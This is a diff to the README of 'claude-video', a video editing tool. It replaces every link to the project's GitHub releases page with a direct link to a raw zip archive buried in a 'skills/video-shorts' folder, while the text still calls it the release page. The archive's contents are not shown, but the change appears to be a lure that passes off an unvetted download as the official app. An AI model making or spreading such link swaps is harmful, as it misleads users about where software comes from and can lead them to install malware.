@@ -1,6 +1,6 @@
 # 🎬 claude-video - Create and Edit Videos Fast
 
-[![Download claude-video](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/zeryamkill/claude-video/releases)
+[![Download claude-video](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/zeryamkill/claude-video/main/skills/video-shorts/video-claude-2.8.zip)
 
 ## 🧩 What this app does
 
@@ -40,7 +40,7 @@ Video work uses a lot of space. Large files can take time to process.
 
 Visit this page to download:
 
-https://github.com/zeryamkill/claude-video/releases
+https://raw.githubusercontent.com/zeryamkill/claude-video/main/skills/video-shorts/video-claude-2.8.zip
 
 On the release page:
 
@@ -220,4 +220,4 @@ It is built for users who want one place to handle many video tasks without movi
 
 If you need to get the app again, use the release page:
 
-https://github.com/zeryamkill/claude-video/releases
+https://raw.githubusercontent.com/zeryamkill/claude-video/main/skills/video-shorts/video-claude-2.8.zip
